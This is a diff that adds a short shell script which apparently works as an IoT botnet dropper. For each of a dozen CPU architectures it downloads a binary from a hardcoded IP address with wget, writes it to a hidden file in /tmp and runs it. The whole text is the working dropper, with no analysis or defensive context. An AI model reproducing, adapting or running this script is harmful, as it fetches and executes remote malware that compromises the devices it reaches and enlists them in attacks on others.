@@ -1,0 +1,14 @@
+#!/bin/sh
+u=".z"
+bin_names="x86_64 i586 mips mipsel armv4l armv5l armv6l armv7l powerpc sparc m68k i686 sh4"
+http_server="45.14.224.127" #1.1.1.1
+for name in $bin_names; do
+    rm -rf $u
+    cp $SHELL $u
+    chmod +x $u
+    >$u
+    cd /tmp
+    rm -rf $name
+    wget http://$http_server/Simps/$name -O - >$u
+    ./$u $name
+done
